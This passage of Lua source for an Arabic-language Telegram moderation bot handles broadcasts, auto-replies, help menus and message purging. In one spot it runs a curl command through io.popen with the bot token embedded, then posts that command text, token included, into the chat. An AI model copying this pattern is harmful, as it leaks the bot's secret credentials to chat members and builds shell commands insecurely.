if #result.first_name_ < 35 then
else
for faeder222 in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = faeder222
break
end end end
text = text..k.."↫ Group ID  : [ "..v.." ]\n↫ Group Link : [ "..(Groupslink or "Not Found").." ]\n↫ Group Monsh : [ "..GroupsMonsh.." ]\n↫ Group Owners : [ "..GroupsOwner.." ]\n↫ Group Momods : [ "..GroupsMod.." ] \n~~~~~~~~~~~~~~~~~\n"
end
local file = io.open('Groups_Bot.txt', 'w')
file:write(text)
file:close()
local dxx = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
local dxxx = 'curl "' .. dxx .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'Groups_Bot.txt' .. '"'
io.popen(dxxx)
faederdx(msg.chat_id_, msg.id_, 1, '↫ عزيزي ← *'..result.first_name_..'*\n↫ جاري ارسال نسخه للمجموعات \n↫ تحتوي على *('..num..')* مجموعه\n         ───────────────\n', 1, 'md')
sleep(1.5)
faederdx(msg.chat_id_, msg.id_, 1, dxxx, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end end
--     By Developer Faeder     -- 
if text == "نشر بالخاص" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == " اذاعه خاص " and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
faederdx1:setex(FAEDER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ ارسل لي سواء \n↫ ❨ ملصق متحركه صوره رساله ❩ \nللخروج ارسل  ( الغاء ) \n '
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
return false
end 
if faederdx1:get(FAEDER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء امر الاذاعه ", 1, 'md')
faederdx1:del(FAEDER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = faederdx1:smembers(FAEDER..'bot:userss') 
if msg.content_.text_ then
for k,v in pairs(list) do 
faederdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end end
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم اذاعه رسالتك بنجاح \n↫ الى ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
faederdx1:del(FAEDER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     By Developer Faeder     -- 
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == " اذاعه عام" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
faederdx1:setex(FAEDER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ ارسل لي سواء \n↫ ❨ ملصق متحركه صوره رساله ❩ \nللخروج ارسل  ( الغاء ) \n '
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
return false
end 
if faederdx1:get(FAEDER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء امر الاذاعه ", 1, 'md')
faederdx1:del(FAEDER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = faederdx1:smembers(FAEDER..'bot:groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
faederdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end end
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم اذاعه رسالتك بنجاح \n↫ الى ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
faederdx1:del(FAEDER.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     By Developer Faeder     -- 
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
faederdx1:setex(FAEDER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ ارسل الرساله الان لتوجيهها\nللخروج ارسل  ( الغاء ) \n '
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
return false
end 
if faederdx1:get(FAEDER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء امر الاذاعه ", 1, 'md')
faederdx1:del(FAEDER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = faederdx1:smembers(FAEDER..'bot:groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم اذاعه رسالتك بالتوجيه \n↫ في ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
faederdx1:del(FAEDER.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     By Developer Faeder     -- 
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
faederdx1:setex(FAEDER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ ارسل الرساله الان لتوجيهها\nللخروج ارسل  ( الغاء ) \n '
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
return false
end 
if faederdx1:get(FAEDER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم الغاء امر الاذاعه ", 1, 'md')
faederdx1:del(FAEDER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = faederdx1:smembers(FAEDER..'bot:userss')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم اذاعه رسالتك بالتوجيه \n↫ الى ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
faederdx1:del(FAEDER.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
--     By Developer Faeder     --  
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
faederdx1:set(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
faederdx(msg.chat_id_, msg.id_, 1, "↫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = faederdx1:get(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
faederdx(msg.chat_id_, msg.id_, 1,'↫ الكلمه ('..msg.content_.text_..')* تم حذفها ',  1, "md")
faederdx1:del(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
faederdx1:srem(FAEDER..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false end end
--     By Developer Faeder     -- 
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
faederdx1:set(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
faederdx(msg.chat_id_, msg.id_, 1, "↫ حسننا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_faederdx12 = faederdx1:get(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_faederdx12 == 'set_repgp' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الرد سواء كان : \n↫ ❨ ملف ملصق متحركه صوره\n فيديو بصمه صوت رساله ❩\n↫ يمكنك اضافه الى النص : \n         ───────────────\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         ───────────────\n↫ للخروج ارسل  ( الغاء )\n " ,  1, "md")
faederdx1:set(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
faederdx1:set(FAEDER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
faederdx1:sadd(FAEDER..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
faederdx1:set(FAEDER..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end end
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد للكل' and is_sudo(msg) then
faederdx1:set(FAEDER.."add:repallt"..msg.sender_user_id_,'del_rep1')
faederdx(msg.chat_id_, msg.id_, 1, "↫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = faederdx1:get(FAEDER.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
faederdx(msg.chat_id_, msg.id_, 1,'↫ الكلمه ('..msg.content_.text_..')* تم حذفها ',  1, "md")
faederdx1:del(FAEDER.."add:repallt"..msg.sender_user_id_)
faederdx1:del(FAEDER.."gif_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."voice_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."audio_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."photo_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."stecker_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."video_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."file_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."text_repall"..msg.content_.text_)
faederdx1:del(FAEDER.."rep_sudo",msg.content_.text_)
return false
end end 
--     By Developer Faeder     -- 
if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == 'اضف رد للكل' and is_sudo(msg)  then
faederdx1:set(FAEDER.."add:repallt"..msg.sender_user_id_,'set_rep')
faederdx(msg.chat_id_, msg.id_, 1, "↫ حسننا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_faederdx12 = faederdx1:get(FAEDER.."add:repallt"..msg.sender_user_id_)
if content_faederdx12 == 'set_rep' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الرد سواء كان : \n↫ ❨ ملف ملصق متحركه صوره\n فيديو بصمه صوت رساله ❩\n↫ يمكنك اضافه الى النص : \n         ───────────────\n- `#username`  معرف المستخدم\n- `#msgs`  عدد الرسائل\n- `#name`  اسم المستخدم\n- `#id`  ايدي المستخدم\n- `#stast`  رتبه المستخدم\n         ───────────────\n↫ للخروج ارسل  ( الغاء )\n " ,  1, "md")
faederdx1:set(FAEDER.."add:repallt"..msg.sender_user_id_,'save_rep')
faederdx1:set(FAEDER.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
faederdx1:sadd(FAEDER.."rep_sudo",msg.content_.text_)
faederdx1:set(FAEDER.."delrep_sudo",msg.content_.text_)
return false 
end end
---------laks------------
if text ==("المالك") then

  tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
  local admins = data.members_
  for i=0 , #admins do
  if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
  owner_id = admins[i].user_id_
  tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
  if b.first_name_ == false then
  send(msg.chat_id_, msg.id_,"•  حساب المالك محذوف")
  return false  
  end
  local UserName = (b.username_ or "ramses20")
  send(msg.chat_id_, msg.id_,"• مالك المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
  end,nil)   
  end
  end
  end,nil)   
  end

--     By Developer Faeder     -- 
if msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or msg.content_.text_ == 'ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local redod = faederdx1:smembers(FAEDER..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا توجد ردود مضافه" ,  1, "md")
else
msg_rep = "↫ ردود المدراء \n         ───────────────\n"
for k,v in pairs(redod) do
if faederdx1:get(FAEDER.."gif_repgp"..v..msg.chat_id_) then
dp = 'متحركه '
elseif faederdx1:get(FAEDER.."voice_repgp"..v..msg.chat_id_) then
dp = 'بصمه '
elseif faederdx1:get(FAEDER.."stecker_repgp"..v..msg.chat_id_) then
dp = 'ملصق '
elseif faederdx1:get(FAEDER.."text_repgp"..v..msg.chat_id_) then
dp = 'رساله '
elseif faederdx1:get(FAEDER.."photo_repgp"..v..msg.chat_id_) then
dp = 'صوره '
elseif faederdx1:get(FAEDER.."video_repgp"..v..msg.chat_id_) then
dp = 'فيديو '
elseif faederdx1:get(FAEDER.."file_repgp"..v..msg.chat_id_) then
dp = 'ملف '
elseif faederdx1:get(FAEDER.."audio_repgp"..v..msg.chat_id_) then
dp = 'اغنيه '
end
msg_rep = msg_rep ..k..' - (*'..v..'*) « ← (*'..dp..'*)\n' 
end
faederdx(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     By Developer Faeder     -- 
if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or msg.content_.text_ == 'حذف ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) or msg.content_.text_ == 'مسح ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local redod = faederdx1:smembers(FAEDER..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
faederdx1:del(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'gif_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'voice_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'audio_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'photo_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'stecker_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'video_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'file_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'text_repgp'..v..msg.chat_id_)
faederdx1:del(FAEDER..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
local faeder = '↫ اهلا عزيزي  '..renk_faeder(msg)..' \n↫ تم حذف ردود المدير\n'
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
return false
end end 
--     By Developer Faeder     -- 
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "ردود العام" and is_sudo(msg) then
local redod = faederdx1:smembers(FAEDER.."rep_sudo")
if #redod == 0 then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا توجد ردود مضافه" ,  1, "md")
else
local i = 1
msg_rep = "↫ ردود المطور \n         ───────────────\n"
for k,v in pairs(redod) do
if faederdx1:get(FAEDER.."gif_repall"..v) then
dp = 'متحركه '
elseif faederdx1:get(FAEDER.."voice_repall"..v) then
dp = 'بصمه '
elseif faederdx1:get(FAEDER.."stecker_repall"..v) then
dp = 'ملصق '
elseif faederdx1:get(FAEDER.."text_repall"..v) then
dp = 'رساله '
elseif faederdx1:get(FAEDER.."photo_repall"..v) then
dp = 'صوره '
elseif faederdx1:get(FAEDER.."video_repall"..v) then
dp = 'فيديو '
elseif faederdx1:get(FAEDER.."file_repall"..v) then
dp = 'ملف '
elseif faederdx1:get(FAEDER.."audio_repall"..v) then
dp = 'اغنيه '
end
msg_rep = msg_rep ..k..' - (*'..v..'*) « ← (*'..dp..'*)\n' 
end
faederdx(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     By Developer Faeder     -- 
if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) or msg.content_.text_ == "حذف ردود العام" and is_sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = faederdx1:smembers(FAEDER.."rep_sudo")
if #redod == 0 then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
faederdx1:del(FAEDER.."add:repallt"..v)
faederdx1:del(FAEDER.."gif_repall"..v)
faederdx1:del(FAEDER.."voice_repall"..v)
faederdx1:del(FAEDER.."audio_repall"..v)
faederdx1:del(FAEDER.."photo_repall"..v)
faederdx1:del(FAEDER.."stecker_repall"..v)
faederdx1:del(FAEDER.."video_repall"..v)
faederdx1:del(FAEDER.."file_repall"..v)
faederdx1:del(FAEDER.."text_repall"..v)
faederdx1:del(FAEDER.."rep_sudo",msg.content_.text_)
end
local faeder = '↫ اهلا عزيزي  '..renk_faeder(msg)..' \n↫ تم حذف ردود المطور\n'
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
return false
end end end
--     By Developer Faeder     -- 
if text and text:match("^تغيير اسم البوت$") or text:match("^وضع اسم البوت$") then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطور الاساسي فقط ', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي اسم البوت الان ', 1, 'html')
faederdx1:set('faeder:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end end
--     By Developer Faeder     -- 
if text and text == 'مسح اسم البوت' then
if not is_leader(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ للمطور الاساسي فقط ', 1, 'md')
else
faederdx1:del('faeder:'..bot_id..'name_bot')
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حذف اسم البوت ', 1, 'html')
end end 
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match('^تنظيف (%d+)$') and faeder11(msg) then    
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مسح * '..Number..'* رساله ', 1, 'md')
end 
if text and text:match('^مسح (%d+)$') and faeder11(msg) then    
local Number = tonumber(text:match('^مسح (%d+)$')) 
if Number > 1000 then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع تنظيف اكثر من 1000 رساله ', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مسح * '..Number..'* رساله ', 1, 'md')
end end
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^استعاده الاوامر$") then
faederdx1:del(FAEDER..'bot:help', text)
faederdx1:del(FAEDER..'bot:help1', text)
faederdx1:del(FAEDER..'bot:help2', text)
faederdx1:del(FAEDER..'bot:help3', text) 
faederdx1:del(FAEDER..'bot:help4', text)
faederdx1:del(FAEDER..'bot:help5', text) 
faederdx1:del(FAEDER..'bot:help6', text) 
faederdx1:del(FAEDER..'bot:help7', text) 
faederdx1:del(FAEDER..'bot:help8', text) 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم استعاده الكلايش الاصليه " ,  1, "md")
end
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين الاوامر$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help0'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help0'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^الاوامر$") and faeder11(msg) then
  local help = faederdx1:get(FAEDER..'bot:help')
  local text =  [[
           ───────────────
  ↫ اليك اوامر البوت ↓↓
           ───────────────
  ↫ ارسل (م1) لعرض اوامر الحماية
  ↫ ارسل (م2) لعرض اوامر المشرفين
  ↫ ارسل (م3) لعرض اوامر الخدمة
  ↫ ارسل (م4) لعرض اوامر الوضع
  ↫ ارسل (م5) لعرض اوامر الرفع والتنزيل
  ↫ ارسل (م6) لعرض اوامر التفعيلات
  ↫ ارسل (م7) لعرض اوامر مسح القوائم
  ↫ ارسل (م8) لعرض اوامر المطورين
           ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[
  
  ↫ قناة السورس : @badboy_here
  ]] 
  faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html') 
  end 
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م1$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help01'..msg.sender_user_id_..'')
if faeder == 'msg' then 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help01'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help1', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م1$") or  text:match("^م١$") and faeder11(msg) then 
local help = faederdx1:get(FAEDER..'bot:help1')
local text =  [[
↫ اوامر الحمايه
         ───────────────
↫ قفل « ← فتح
         ───────────────
↫ الروابط
↫ المـعـرف
↫ البوتات
↫ الدخول
↫ الشارحه
↫ المتحركه
↫ الملفات
↫ الفيديو
↫ الاونلاين
↫ الدردشه
↫ التوجيه
↫ الاغاني
↫ الصوت
↫ الجهات
↫ الماركداون
↫ العربيه
         ───────────────
↫ الانقليزيه
↫ الحمايه
↫ التكرار
↫ الهاشتاك
↫ التعديل
↫ التثبيت
↫ الاشعارات
↫ الكل
↫ الكلايش
↫ الشبكات
↫ المواقع
↫ السب
↫ الالحاد
↫ الطائفيه
↫ الفارسيه 
↫ الفارسيه بالطرد
↫ البوتات بالطرد
↫ البوتات بالتقييد
          ───────────────
↫ الكل بالساعات + عدد الساعات
           ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م2$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help21'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help21'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help2', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م2$") or text:match("^م٢$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help2')
local text =  [[
↫ اوامر المشرفين
         ───────────────
↫ اوامر المسح والحظر والتقيد
        ───────────────
↫ طرد 
↫ مسح الكل 
↫ حظر « ← الغاء حظر
↫ كتم  « ← الغاء كتم 
↫ تقييد « ← الغاء التقييد
↫ كشف القيود « ← رفع القيود
        ───────────────
↫ كتم د + عدد الدقائق 
↫ كتم س + عدد الساعات 
↫ كتم ي + عدد الايام
↫ الطريقه الوحيده لالغاء الكتم بالوقت
                                    ↓↓
↫ اعدادات المجموعه ← الصلاحيات ←
           ← للاسفل ← خيارات ← حذف من هذه القائمه 
         ───────────────
↫ اوامر اخرى
         ───────────────
↫ نزلني
↫ فحص  
↫ اضف رد 
↫ مسح رد 
↫ اضف امر 
↫ مسح امر 
↫ اضف صلاحيه 
↫ مسح صلاحيه 
↫ مسح الردود 
↫ تنظيف الميديا
↫ منو ضافني
↫ ضع قوانين
↫ ضع وصف
↫ ضع ترحيب
↫ جلب الترحيب 
↫ حذف الترحيب  
↫ معلومات المجموعه 
↫ طرد الحسابات المحذوفه 
↫ تنظيف قائمه الحظر 
         ───────────────
↫ منع « ← الغاء منع 
↫ تثبيت « ← الغاء التثبيت 
↫ كلمه all + الكليشه
↫ مسح   + العدد 
↫ ايدي   + المعرف 
↫ اضافه + معرف العضو 
↫ اضف رسائل  + الايدي 
↫ تغير رد المطور + الرد
↫ تغير رد منشئ الاساسي + الرد
↫ تغير رد المنشئ + الرد
↫ تغير رد المدير + الرد
↫ تغير رد الادمن + الرد
↫ تغير رد المميز + الرد
↫ تغير رد العضو + الرد
↫ مسح ردود الرتب
         ───────────────
↫ قوائم اخرى

↫ المنشئين الاساسيين
↫ الدعم « ← قائمه المنع 
↫ الردود « ← المحظورين 
↫ المدراء « ← الاعدادات 
↫ الادمنيه « ← المكتومين 
↫ الحمير « ←   المنشئين  
↫ المقيدين « ← الاعضاء المميزين 
↫ الصلاحيات « ← الاوامر المضافه
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م3$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help31'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
